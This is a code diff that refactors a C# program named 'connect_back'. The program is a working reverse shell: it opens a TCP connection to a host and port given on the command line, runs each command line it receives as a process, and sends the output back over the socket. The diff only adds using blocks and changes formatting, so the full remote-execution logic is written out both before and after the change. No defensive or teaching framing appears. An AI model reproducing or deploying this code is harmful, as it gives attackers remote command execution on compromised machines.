@@ -10,32 +10,34 @@ namespace connect_back
 	{
 		public static void Main (string[] args)
 		{
-			TcpClient client = new TcpClient (args [0], int.Parse (args [1]));
-			Stream stream = client.GetStream ();
-			using (StreamReader rdr = new StreamReader(stream)) {
-				while (stream.CanRead) {				
-					string cmd = rdr.ReadLine();
-					string filename = string.Empty;
-					string arg = string.Empty;
+			using (TcpClient client = new TcpClient (args [0], int.Parse (args [1]))) {
+				using (Stream stream = client.GetStream ()) {
+					using (StreamReader rdr = new StreamReader (stream)) {
+						while (stream.CanRead) {				
+							string cmd = rdr.ReadLine ();
+							string filename = string.Empty;
+							string arg = string.Empty;
 
-					if (cmd.IndexOf(' ') > -1) { 
-						filename = cmd.Substring(0, cmd.IndexOf(' '));
-						arg = cmd.Substring(cmd.IndexOf(' '), cmd.Length - filename.Length);
-					} else {
-						filename = cmd;
-					}
+							if (cmd.IndexOf (' ') > -1) { 
+								filename = cmd.Substring (0, cmd.IndexOf (' '));
+								arg = cmd.Substring (cmd.IndexOf (' '), cmd.Length - filename.Length);
+							} else {
+								filename = cmd;
+							}
 
-					Process prc = new Process();
-					prc.StartInfo = new ProcessStartInfo();
-					prc.StartInfo.FileName = filename;
-					prc.StartInfo.Arguments = arg;
-					prc.StartInfo.UseShellExecute = false;
-					prc.StartInfo.RedirectStandardOutput = true;
-					prc.Start();
-					prc.WaitForExit();
+							Process prc = new Process ();
+							prc.StartInfo = new ProcessStartInfo ();
+							prc.StartInfo.FileName = filename;
+							prc.StartInfo.Arguments = arg;
+							prc.StartInfo.UseShellExecute = false;
+							prc.StartInfo.RedirectStandardOutput = true;
+							prc.Start ();
+							prc.WaitForExit ();
 					 
-					byte[] results = Encoding.ASCII.GetBytes(prc.StandardOutput.ReadToEnd());
-					stream.Write(results, 0, results.Length);
+							byte[] results = Encoding.ASCII.GetBytes (prc.StandardOutput.ReadToEnd ());
+							stream.Write (results, 0, results.Length);
+						}
+					}
 				}
 			}
 		}
